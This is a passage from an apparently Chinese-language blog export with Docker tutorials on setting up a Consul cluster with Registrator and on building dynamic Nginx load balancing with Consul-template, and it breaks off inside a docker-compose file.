<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --name=node3 --restart=always \</span><br><span class="line">             -e 'CONSUL_LOCAL_CONFIG=&#123;"skip_leave_on_interrupt": true&#125;' \</span><br><span class="line">             -p 10300:8300  \</span><br><span class="line">             -p 10301:8301 \</span><br><span class="line">             -p 10301:8301/udp \</span><br><span class="line">             -p 10302:8302/udp \</span><br><span class="line">             -p 10302:8302 \</span><br><span class="line">             -p 10400:8400 \</span><br><span class="line">             -p 10500:8500 \</span><br><span class="line">             -p 10600:8600 \</span><br><span class="line">             -h node2 \</span><br><span class="line">             consul agent -server -bind=172.17.0.4 \</span><br><span class="line">             -join=192.168.127.128 -node-id=$(uuidgen | awk '&#123;print tolower($0)&#125;') \</span><br><span class="line">             -node=node3 \</span><br><span class="line">             -data-dir=/tmp/data-dir -client 0.0.0.0 -ui</span><br></pre></td></tr></table></figure>

<p>查看<code>node3</code>节点的进程启动日志：</p>
<p><img src="/articles/a2710f6/5.png" alt></p>
<p>当3个<code>Server</code>节点都启动并正常运行时，观察<code>node2</code>和<code>node3</code>的进程日志，可以发现<code>node1</code>被选举为<code>leader</code>节点，也就是这个<strong>数据中心</strong>的<code>Server Master</code>。</p>
<p>再次查看<code>node1</code>节点的进程启动日志：</p>
<p><img src="/articles/a2710f6/6.png" alt></p>
<p>观察日志发现，<code>node2</code>和<code>node3</code>都成功join到了<code>node1</code>所在的数据中心<code>dc1</code>。当集群中有3台<code>Consul Server</code>启动时，<code>node1</code>被选举为<code>dc1</code>中的主节点。然后，<code>node1</code>会通过心跳检查的方式，不断地对<code>node2</code>和<code>node3</code>进行健康检查。</p>
<h4 id="启动Client节点"><a href="#启动Client节点" class="headerlink" title="启动Client节点"></a>启动Client节点</h4><p><strong>node4</strong>:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --name=node4  --restart=always \</span><br><span class="line">            -e 'CONSUL_LOCAL_CONFIG=&#123;"leave_on_terminate": true&#125;' \</span><br><span class="line">            -p 11300:8300 \</span><br><span class="line">            -p 11301:8301 \</span><br><span class="line">            -p 11301:8301/udp \</span><br><span class="line">            -p 11302:8302/udp \</span><br><span class="line">            -p 11302:8302 \</span><br><span class="line">            -p 11400:8400 \</span><br><span class="line">            -p 11500:8500 \</span><br><span class="line">            -p 11600:8600 \</span><br><span class="line">            -h node4 \</span><br><span class="line">            consul agent -bind=172.17.0.5 -retry-join=192.168.127.128  \</span><br><span class="line">            -node-id=$(uuidgen | awk '&#123;print tolower($0)&#125;') \</span><br><span class="line">            -node=node4 -client 0.0.0.0 -ui</span><br></pre></td></tr></table></figure>

<p>查看<code>node4</code>节点的进程启动日志:</p>
<p><img src="/articles/a2710f6/7.png" alt></p>
<p>可以发现：<code>node4</code>是以<code>Client</code>模式启动运行的。启动后完成后，把<code>dc1</code>数据中心中的以<code>Server</code>模式启动的节点<code>node1</code>、<code>node2</code>和<code>node3</code>都添加到<strong>本地缓存列表</strong>中。当客户端向<code>node4</code>发起服务发现的请求后，<code>node4</code>会通过<code>RPC</code>将请求转发给<code>Server</code>节点中的其中一台做处理。</p>
<h4 id="查看集群状态"><a href="#查看集群状态" class="headerlink" title="查看集群状态"></a>查看集群状态</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec -t node1 consul members</span><br></pre></td></tr></table></figure>

<p><code>dc1</code>数据中心中的4个节点<code>node1</code>, <code>node2</code>, <code>node3</code>和<code>node4</code>分别成功启动，<code>Status</code>表示他们的状态，都为<code>alive</code>。<code>node1</code>, <code>node2</code>, <code>node3</code>以<code>Server</code>模式启动，而<code>node4</code>以<code>Client</code>模式启动。</p>
<p><img src="/articles/a2710f6/8.png" alt></p>
<h2 id="Docker安装Registrator"><a href="#Docker安装Registrator" class="headerlink" title="Docker安装Registrator"></a>Docker安装Registrator</h2><h4 id="拉取Registrator的镜像"><a href="#拉取Registrator的镜像" class="headerlink" title="拉取Registrator的镜像"></a>拉取Registrator的镜像</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull gliderlabs/registrator:latest</span><br></pre></td></tr></table></figure>

<h4 id="启动Registrator节点"><a href="#启动Registrator节点" class="headerlink" title="启动Registrator节点"></a>启动Registrator节点</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --name=registrator \</span><br><span class="line">             -v /var/run/docker.sock:/tmp/docker.sock \</span><br><span class="line">             --net=host \</span><br><span class="line">             gliderlabs/registrator -ip="192.168.127.128" consul://192.168.127.128:8500</span><br></pre></td></tr></table></figure>

<blockquote>
<p>–net指定为host表明使用主机模式。<br> -ip用于指定宿主机的IP地址，用于健康检查的通信地址。<br> consul://192.168.127.128:8500: 使用Consul作为服务注册表，指定具体的Consul通信地址进行服务注册和注销（注意：8500是Consul对外暴露的HTTP通信端口）。</p>
</blockquote>
<p>查看<code>Registrator</code>的容器进程启动日志：</p>
<p><img src="/articles/a2710f6/9.png" alt></p>
<p><code>Registrator</code>在启动过程完成了以下几步操作：</p>
<ol>
<li>查看Consul数据中心的leader节点，作为服务注册表；</li>
<li>同步当前宿主机的启用容器，以及所有的服务端口；</li>
<li>分别将各个容器发布的服务地址/端口注册到Consul的服务注册列表。</li>
</ol>
<h4 id="查看Consul的注册状态"><a href="#查看Consul的注册状态" class="headerlink" title="查看Consul的注册状态"></a>查看Consul的注册状态</h4><p><code>Consul</code>提供了一个<code>Web UI</code>来可视化<strong>服务注册列表</strong>、<strong>通信节点</strong>、<strong>数据中心</strong>和<strong>键/值存储</strong>等，直接访问宿主机的<code>8500</code>端口。</p>
<p><strong>服务注册列表</strong>：</p>
<p><img src="/articles/a2710f6/10.png" alt></p>
<p><code>NODES</code>节点下挂载着<code>dc1</code>数据中心中的所有的<code>Consul</code>节点，包括<code>Consul Server</code>和<code>Client</code>。</p>
<p><strong>通信节点列表</strong>：</p>
<p><img src="/articles/a2710f6/11.png" alt></p>
<p>启动<code>Registrator</code>以后，宿主机中的所有容器把服务都注册到<code>Consul</code>的<code>SERVICES</code>上，测试完成！</p>
<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>单数据中心</strong>的<code>Consul</code>集群的搭建就完成了！！！后续章节我会介绍如何使用<code>Registrator</code>进行服务注册的<strong>标签化</strong>。然后通过<code>docker</code>部署<strong>多实例</strong>的<code>Web</code>容器来实现基于<code>HTTP</code>的<code>RESTful Service</code>和基于<code>TCP</code>的<code>RPC Service</code>的<strong>服务注册</strong>和<strong>健康检查定义</strong>，并演示如何以<strong>标签</strong>标识一个服务的多个实例。</p>
]]></content>
      <categories>
        <category>自动化</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>基于Docker+Consul+Nginx+Consul-Template的服务负载均衡实现</title>
    <url>/articles/5ab1727a.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>本文详细介绍基于Docker+Consul+Nginx+Consul-Template的服务负载均衡实现过程。</p>
<a id="more"></a>

<h2 id="软件介绍"><a href="#软件介绍" class="headerlink" title="软件介绍"></a>软件介绍</h2><h4 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h4><p>一个高性能的 <code>HTTP</code> 和<strong>反向代理服务器</strong>，用于前端访问流量到后台应用服务器<strong>负载均衡</strong>和<strong>请求转发</strong>。</p>
<h4 id="Consul-template"><a href="#Consul-template" class="headerlink" title="Consul-template"></a>Consul-template</h4><p><code>Consul-template</code> 是 <code>HashiCorp</code> 基于 <code>Consul</code> 所提供的可扩展的工具，通过监听 <code>Consul</code> 中的<strong>数据变化</strong>，动态地修改一些<strong>配置文件</strong>中地<strong>模板</strong>。常用于在 <code>Nginx</code>、<code>HAProxy</code> 上动态配置健康状态下的客户端反向代理信息。</p>
<h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><ul>
<li>通过 <code>Nginx</code> 自身实现<strong>负载均衡</strong>和<strong>请求转发</strong>；</li>
<li>通过 <code>Consul-template</code> 的 <code>config</code> 功能实时监控 <code>Consul</code> 集群节点的<strong>服务</strong>和<strong>数据</strong>的变化；</li>
<li>实时的用 <code>Consul</code> 节点的信息<strong>替换</strong> <code>Nginx</code> 配置文件的<strong>模板</strong>，并<strong>重新加载</strong>配置文件；</li>
</ul>
<blockquote>
<p><code>Consul-template</code> 和 <code>nginx</code> 必须安装在同一台机器上，因为 <code>Consul-template</code> 需要动态修改 <code>nginx</code> 的配置文件 <code>nginx.conf</code>，然后执行 <code>nginx -s reload</code> 命令进行路由更新，达到<strong>动态负载均衡</strong>的目的。</p>
</blockquote>
<h4 id="传统负载均衡"><a href="#传统负载均衡" class="headerlink" title="传统负载均衡"></a>传统负载均衡</h4><p>传统的负载均衡，就是 <code>Client</code> 支姐访问 <code>Nginx</code>，然后被转发到后端某一台 <code>Web Server</code>。如果后端有<strong>添加</strong>/<strong>删除</strong> <code>Web Server</code>，运维需要手动改下 <code>nginx.conf</code> ，然后<strong>重新载入配置</strong>，就可以动态的调整负载均衡。</p>
<p><img src="/articles/5ab1727a/1.png" alt></p>
<h3 id="2-2-自动负载均衡"><a href="#2-2-自动负载均衡" class="headerlink" title="2.2. 自动负载均衡"></a>2.2. 自动负载均衡</h3><p>再看看基于服务自动发现和注册的负载均衡，负载均衡的方式没有变，只是多了一些<strong>外围组件</strong>，当然这些组件对 <code>Client</code> 是不可见的，<code>client</code> 依然只能看到 <code>Nginx</code> 入口，访问方式也没变化。</p>
<p><img src="/articles/5ab1727a/2.png" alt></p>
<p><code>Nginx</code> 的动态负载均衡实现流程如下：</p>
<ol>
<li>以相同的 <code>Consul</code> <strong>标签</strong>对 <code>Web Server</code> 进行<strong>服务标记</strong>和<strong>分类</strong>，<strong>新增</strong>或者<strong>删除</strong> <code>Web Server</code> 服务器节点；</li>
<li><code>Registrator</code> <strong>监控</strong>到 <code>Web Server</code> 的状态更新，自动在 <code>Consul</code>服务注册中心将它<strong>注册</strong>或者<strong>注销</strong>；</li>
<li><code>Consul-template</code> 订阅了 <code>Consul</code> 服务注册中心的<strong>服务消息</strong>，接收到 <code>Consul</code> 的消息推送，即 <code>Web Server</code> 服务节点<strong>状态</strong>发生改变。</li>
<li><code>Consul-template</code> 自动去修改和<strong>替换</strong> <code>Nginx</code> 服务器下的 <code>nginx</code>配置文件中的<strong>模板</strong>，并<strong>重新加载</strong>服务达到自动负载均衡的目的。</li>
</ol>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h4 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h4><table>
<thead>
<tr>
<th align="left">软件</th>
<th align="left">版本</th>
</tr>
</thead>
<tbody><tr>
<td align="left">操作系统</td>
<td align="left">Ubuntu：16.04 x86_64，内核：4.8.0-58-generic</td>
</tr>
<tr>
<td align="left">docker</td>
<td align="left">Docker version 1.12.6, build 78d1802</td>
</tr>
<tr>
<td align="left">docker-compose</td>
<td align="left">docker-compose version 1.8.0</td>
</tr>
</tbody></table>
<h4 id="节点规划"><a href="#节点规划" class="headerlink" title="节点规划"></a>节点规划</h4><table>
<thead>
<tr>
<th align="left">主机IP</th>
<th align="left">组件</th>
</tr>
</thead>
<tbody><tr>
<td align="left">192.168.1.181</td>
<td align="left">Consul Server, Registrator, Nginx, Consul-template</td>
</tr>
<tr>
<td align="left">192.168.1.186</td>
<td align="left">Consul Server, Registrator, Nginx, Consul-template</td>
</tr>
<tr>
<td align="left">192.168.1.182</td>
<td align="left">Consul Client, Registrator, Client WebApp1, Server WebApp1, Server WebApp2</td>
</tr>
<tr>
<td align="left">192.168.1.183</td>
<td align="left">Consul Client, Registrator, Client WebApp2, Server WebApp3, Server WebApp4</td>
</tr>
<tr>
<td align="left">192.168.1.185</td>
<td align="left">Consul Client, Registrator, Client WebApp3, Server WebApp5, Server WebApp6</td>
</tr>
</tbody></table>
<ul>
<li><strong>Client WebApp</strong>：提供基于<code>Thrift</code>的<code>RPC</code>客户端和基于<code>Http</code>协议的<code>RESTful</code>客户端，用于访问 <code>Server</code> 程序。</li>
<li><strong>Server WebApp</strong>：提供基于<code>Thrift</code>的<code>RPC</code>服务端和基于<code>Http</code>协议的<code>RESTful</code>服务端，供 <code>Client</code> 程序调用。</li>
</ul>
<p>这里的3台主机 - <code>192.168.1.182</code>、<code>192.168.1.183</code> 和 <code>192.168.1.185</code>，每台主机部署两个 <code>Client WebApp</code> 容器和一个 <code>Client Server</code> 容器，用于模拟<strong>服务层</strong>的负载均衡。</p>
<h4 id="镜像构建"><a href="#镜像构建" class="headerlink" title="镜像构建"></a>镜像构建</h4><ul>
<li><strong>Consul</strong>：consul:latest</li>
<li><strong>Registrator</strong>：gliderlabs/registrator:latest</li>
<li><strong>Nginx</strong>和<strong>Consul-template</strong>：liberalman/nginx-consul-template:latest</li>
<li><strong>Client WebApp</strong>：test-client:latest</li>
<li><strong>Server WebApp</strong>：test-server:latest</li>
</ul>
<p>这里先说说 <code>test-client</code> 和 <code>test-server</code> 的镜像构建：</p>
<ol>
<li>克隆项目到本地项目环境： <a href="https://github.com/ostenant/spring-cloud-starter-thrift" target="_blank" rel="noopener">https://github.com/ostenant/spring-cloud-starter-thrift</a> </li>
<li>切换到子模块 <code>spring-cloud-starter-thrift-examples</code> 下的 <code>test</code> 目录，执行命令 <code>mvn clean package</code> 进行程序打包。</li>
<li>分别将 <code>test-client</code> 和 <code>test-server</code> 项目<strong>根目录</strong>下的 <code>Dockerfile</code> 文件和<code>target</code>目录下的 <code>target/*.jar</code>程序拷贝到 <code>192.168.1.182</code> 、<code>192.168.1.183</code> 和 <code>192.168.1.185</code> 目录下。</li>
<li>进入<strong>客户端</strong> <code>Dockerfile</code> 所在目录，对<strong>客户端</strong>程序 <code>test-client</code> 进行镜像构建，命令如下：<code>docker build . -t test-client:latest</code> </li>
<li>进入<strong>服务端</strong> <code>Dockerfile</code> 所在目录，对<strong>服务端</strong>程序 <code>test-server</code> 进行镜像构建，命令如下：<code>docker build . -t test-server:latest</code> </li>
</ol>
<p>构建完成后查看本地镜像库：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>

<p><img src="/articles/5ab1727a/3.png" alt></p>
<h4 id="部署模型"><a href="#部署模型" class="headerlink" title="部署模型"></a>部署模型</h4><p>五台主机，其中 <code>192.168.1.181</code> 和 <code>192.168.1.186</code> 两台主机的主要作用如下：</p>
<ol>
<li>作为<strong>负载均衡转发器</strong> (这里只是演示，可以通过 <code>KeepAlived</code> 实现 <code>Nginx</code> 的<code>HA</code>)，将前端访问流量经过<strong>负载算法</strong>一次转发到后台 <code>Client WebApp</code> 。</li>
<li>以 <code>Server</code>模式启动 <code>Consul</code>节点，其中一台作为整个<strong>服务发现与注册集群</strong>的 <code>leader</code>， 用于<strong>同步</strong>和<strong>持久化</strong>其余三台 <code>Client</code> 模式的 <code>Consul</code> 节点的<strong>数据</strong>和<strong>状态信息</strong>。</li>
</ol>
<p>其余三台主机 - <code>192.168.1.182</code>、<code>192.168.1.183</code> 和 <code>192.168.1.185</code>，充当的角色如下：</p>
<ol>
<li>每台分别以 <code>Client</code> 模式部署 <code>Consul</code> 节点，用于<strong>注册</strong>和<strong>发现</strong>本机 <code>docker</code> 容器暴露的服务，同时和 <code>Consul Server</code> 的  <code>leader</code> 节点进行<strong>服务状态同步</strong>。</li>
<li>分别启动一个 <code>Client WebApp</code> 容器实例和两个 <code>Server WebApp</code> 容器实例，将 <code>Client WebApp</code> 的请求根据<strong>服务层</strong>的负载算法<strong>二次转发</strong>到 <code>Server WebApp</code> 中的任意一台上完成具体的业务处理。</li>
</ol>
<p><img src="/articles/5ab1727a/4.png" alt></p>
<p>这里有两次服务转发操作：</p>
<ul>
<li><strong>接入层的转发：</strong>两台 <code>Nginx</code> 服务器将客户流量，经由<strong>一次转发</strong>至三个 <code>Client WebApp</code> 服务实例中任意一个做处理。</li>
<li><strong>服务层的转发：</strong>三个 <code>Client WebApp</code>服务实例其中之一，根据从<strong>服务注册中心</strong>拉取的健康的<strong>服务缓存列表</strong>，将请求<strong>二次转发</strong>至六个 <code>Server WebApp</code>服务实例其中之一做处理。</li>
</ul>
<h2 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h2><h4 id="Consul-Server主机"><a href="#Consul-Server主机" class="headerlink" title="Consul Server主机"></a>Consul Server主机</h4><p>(a). 分别编写 <code>docker-compose.yml</code>，注意 <code>Registrator</code> 需要配置各自的 <code>IP</code>地址。</p>
<ul>
<li><strong>主机：192.168.1.181</strong></li>
</ul>
<p>docker-compose.yml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'2'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr">  load_balancer:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">liberalman/nginx-consul-template:latest</span></span><br><span class="line"><span class="attr">    hostname:</span> <span class="string">lb</span></span><br><span class="line"><span class="attr">    links:</span></span><br><span class="line"><span class="attr">      - consul_server_master:</span><span class="string">consul</span></span><br><span class="line"><span class="attr">    ports:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"80:80"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  consul_server_master:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="attr">consul:latest</span></span><br><span class="line"><span class="attr">    hostname:</span> <span class="string">consul_server_master</span></span><br><span class="line"><span class="attr">    ports:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8300:8300"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8301:8301"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8302:8302"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8400:8400"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8500:8500"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8600:8600"</span></span><br><span class="line"><span class="attr">    command:</span> <span class="string">consul</span> <span class="string">agent</span> <span class="bullet">-server</span> <span class="bullet">-bootstrap-expect</span> <span class="number">1</span> <span class="bullet">-advertise</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span> <span class="bullet">-node</span> <span class="string">consul_server_master</span> <span class="bullet">-data-dir</span> <span class="string">/tmp/data-dir</span> <span class="bullet">-client</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="bullet">-ui</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  registrator:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">gliderlabs/registrator:latest</span></span><br><span class="line"><span class="attr">    hostname:</span> <span class="string">registrator</span></span><br><span class="line"><span class="attr">    links:</span></span><br><span class="line"><span class="attr">      - consul_server_master:</span><span class="string">consul</span></span><br><span class="line"><span class="attr">    volumes:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"/var/run/docker.sock:/tmp/docker.sock"</span></span><br><span class="line"><span class="attr">    command:</span>  <span class="bullet">-ip</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span> <span class="attr">consul://192.168.1.181:8500</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>主机：192.168.1.186</strong></li>
</ul>
<p>docker-compose.yml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'2'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr">  load_balancer:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">liberalman/nginx-consul-template:latest</span></span><br><span class="line"><span class="attr">    hostname:</span> <span class="string">lb</span></span><br><span class="line"><span class="attr">    links:</span></span><br><span class="line"><span class="attr">      - consul_server_slave:</span><span class="string">consul</span></span><br><span class="line"><span class="attr">    ports:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"80:80"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  consul_server_slave:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="attr">consul:latest</span></span><br><span class="line"><span class="attr">    hostname:</span> <span class="string">consul_server_slave</span></span><br><span class="line"><span class="attr">    ports:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8300:8300"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8301:8301"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8302:8302"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8400:8400"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8500:8500"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8600:8600"</span></span><br><span class="line"><span class="attr">    command:</span> <span class="string">consul</span> <span class="string">agent</span> <span class="bullet">-server</span> <span class="bullet">-join=192.168.1.181</span> <span class="bullet">-advertise</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.186</span> <span class="bullet">-node</span> <span class="string">consul_server_slave</span> <span class="bullet">-data-dir</span> <span class="string">/tmp/data-dir</span> <span class="bullet">-client</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="bullet">-ui</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  registrator:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">gliderlabs/registrator:latest</span></span><br><span class="line"><span class="attr">    hostname:</span> <span class="string">registrator</span></span><br><span class="line"><span class="attr">    links:</span></span><br><span class="line"><span class="attr">      - consul_server_slave:</span><span class="string">consul</span></span><br><span class="line"><span class="attr">    volumes:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"/var/run/docker.sock:/tmp/docker.sock"</span></span><br><span class="line"><span class="attr">    command:</span>  <span class="bullet">-ip</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.186</span> <span class="attr">consul://192.168.1.186:8500</span></span><br></pre></td></tr></table></figure>

<p>(b). 在两台主机上分别通过 <code>docker-compose</code> 启动多容器应用，命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>这是在主机 <code>192.168.1.181</code> 上运行启动命令时的输出，可以看到 <code>docker-compose</code> 启动时会先去检查<strong>目标镜像文件</strong>是否拉取到本地，然后依次<strong>创建</strong>并<strong>启动</strong> <code>docker-compose.yml</code> 文件配置的<strong>容器实例</strong>。</p>
<p><img src="/articles/5ab1727a/5.png" alt></p>
<p>(c). 查看正常启动的容器进程，观察<code>Consul</code>、<code>Registrator</code> 和 <code>Nginx</code>/<code>Consul-template</code>的容器都正常启动。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>

<p><img src="/articles/5ab1727a/6.png" alt></p>
<p>(d). 利用 <code>docker-compose</code>，以相同的方式在主机 <code>192.168.1.186</code> 上启动所配置的容器服务实例，查看启动状态</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker   ps</span><br></pre></td></tr></table></figure>

<p><img src="/articles/5ab1727a/7.png" alt></p>
<p>(e). 访问 <code>http://IP:8500</code> 查看 <code>Consul Server</code> 的<strong>节点信息</strong>和<strong>服务注册列表</strong>。</p>
<ul>
<li>节点信息：</li>
</ul>
<p><img src="/articles/5ab1727a/8.png" alt></p>
<ul>
<li>服务状态列表：</li>
</ul>
<p><img src="/articles/5ab1727a/9.png" alt></p>
<p>两台 <code>Consul Server</code> 主机上的容器服务实例均正常启动！</p>
<h4 id="Consul-Client主机"><a href="#Consul-Client主机" class="headerlink" title="Consul Client主机"></a>Consul Client主机</h4><p>一般情况下，我们把 <code>Consul</code> 作为服务注册与发现中心，会使用它提供的<strong>服务定义</strong> (<code>Service Definition</code>) 和<strong>健康检查定义</strong> (<code>Health Check Definition</code>) 功能，相关配置说明参考如下：</p>
<h5 id="服务定义"><a href="#服务定义" class="headerlink" title="服务定义"></a>服务定义</h5><table>
<thead>
<tr>
<th align="left">环境变量Key</th>
<th align="left">环境变量Value</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SERVICE_ID</td>
<td align="left">web-001</td>
<td align="left">可以为GUID或者可读性更强变量，保证不重复</td>
</tr>
<tr>
<td align="left">SERVICE_NAME</td>
<td align="left">web</td>
<td align="left">如果ID没有设置，Consul会将name作为id，则有可能注册失败</td>
</tr>
<tr>
<td align="left">SERVICE_TAGS</td>
<td align="left">nodejs,web</td>
<td align="left">服务的标签，用逗号分隔，开发者可以根据标签来查询一些信息</td>
</tr>
<tr>
<td align="left">SERVICE_IP</td>
<td align="left">内网IP</td>
<td align="left">要使用Consul，可访问的IP</td>
</tr>
<tr>
<td align="left">SERVICE_PORT</td>
<td align="left">50001</td>
<td align="left">应用的IP, 如果应用监听了多个端口，理应被视为多个应用</td>
</tr>
<tr>
<td align="left">SERVICE_IGNORE</td>
<td align="left">Boolean</td>
<td align="left">是否忽略本Container，可以为一些不需要注册的Container添加此属性</td>
</tr>
</tbody></table>
<h5 id="服健康检查定义"><a href="#服健康检查定义" class="headerlink" title="服健康检查定义"></a>服健康检查定义</h5><p>配置原则为: <code>SERVICE_XXX_*</code>。如果你的应用监听的是 <code>5000</code> 端口，则改为 <code>SERVICE_5000_CHECK_HTTP</code>，其它环境变量配置同理。</p>
<table>
<thead>
<tr>
<th align="left">环境变量Key</th>
<th align="left">环境变量Value</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">— 以下为HTTP模式</td>
<td align="left">—</td>
<td align="left">—</td>
</tr>
<tr>
<td align="left">SERVICE_80_CHECK_HTTP</td>
<td align="left">/path_to_health_check</td>
<td align="left">你的健康状态检查的路径如 /status</td>
</tr>
<tr>
<td align="left">SERVICE_80_CHECK_INTERVAL</td>
<td align="left">15s</td>
<td align="left">15秒检查一次</td>
</tr>
<tr>
<td align="left">SERVICE_80_CHECK_TIMEOUT</td>
<td align="left">2s</td>
<td align="left">状态检查超时时间</td>
</tr>
<tr>
<td align="left">— 以下为HTTPS模式</td>
<td align="left">—</td>
<td align="left">—</td>
</tr>
<tr>
<td align="left">SERVICE_443_CHECK_HTTPS</td>
<td align="left">/path_to_health_check</td>
<td align="left">你的健康状态检查的路径如 /status</td>
</tr>
<tr>
<td align="left">SERVICE_443_CHECK_INTERVAL</td>
<td align="left">15s</td>
<td align="left">15秒检查一次</td>
</tr>
<tr>
<td align="left">SERVICE_443_CHECK_TIMEOUT</td>
<td align="left">2s</td>
<td align="left">状态检查超时时间</td>
</tr>
<tr>
<td align="left">— 以下为TCP模式</td>
<td align="left">—</td>
<td align="left">—</td>
</tr>
<tr>
<td align="left">SERVICE_443_CHECK_TCP</td>
<td align="left">/path_to_health_check</td>
<td align="left">你的健康状态检查的路径如 /status</td>
</tr>
<tr>
<td align="left">SERVICE_443_CHECK_INTERVAL</td>
<td align="left">15s</td>
<td align="left">15秒检查一次</td>
</tr>
<tr>
<td align="left">SERVICE_443_CHECK_TIMEOUT</td>
<td align="left">2s</td>
<td align="left">状态检查超时时间</td>
</tr>
<tr>
<td align="left">— 使用脚本检查</td>
<td align="left">—</td>
<td align="left">—</td>
</tr>
<tr>
<td align="left">SERVICE_CHECK_SCRIPT</td>
<td align="left">curl –silent –fail example.com</td>
<td align="left">如官方例子中的check_redis.py</td>
</tr>
<tr>
<td align="left">— 其他</td>
<td align="left">—</td>
<td align="left">—</td>
</tr>
<tr>
<td align="left">SERVICE_CHECK_INITIAL_STATUS</td>
<td align="left">passing</td>
<td align="left">Consul默认注册后的服务为failed</td>
</tr>
</tbody></table>
<h5 id="配置说明"><a href="#配置说明" class="headerlink" title="配置说明"></a>配置说明</h5><p>(a). 分别编写 <code>docker-compose.yml</code>，同样注意 <code>Registrator</code> 需要配置各自的 <code>IP</code> 地址。<code>test-server</code> 和 <code>test-client</code> 的<strong>服务实例</strong>在配置时需要指定相关的<strong>环境变量</strong>。</p>
<ul>
<li><strong>主机：192.168.1.182</strong></li>
</ul>
<p>docker-compose.yml</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'2'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr">  consul_client_01:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="attr">consul:latest</span></span><br><span class="line"><span class="attr">    ports:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8300:8300"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8301:8301"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8301:8301/udp"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8302:8302"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8302:8302/udp"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8400:8400"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8500:8500"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8600:8600"</span></span><br><span class="line"><span class="attr">    command:</span> <span class="string">consul</span> <span class="string">agent</span> <span class="bullet">-retry-join</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span> <span class="bullet">-advertise</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.182</span> <span class="bullet">-node</span> <span class="string">consul_client_01</span> <span class="bullet">-data-dir</span> <span class="string">/tmp/data-dir</span> <span class="bullet">-client</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="bullet">-ui</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  registrator:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">gliderlabs/registrator:latest</span></span><br><span class="line"><span class="attr">    volumes:</span></span><br><span class="line"><span class="bullet">      -</span> <span 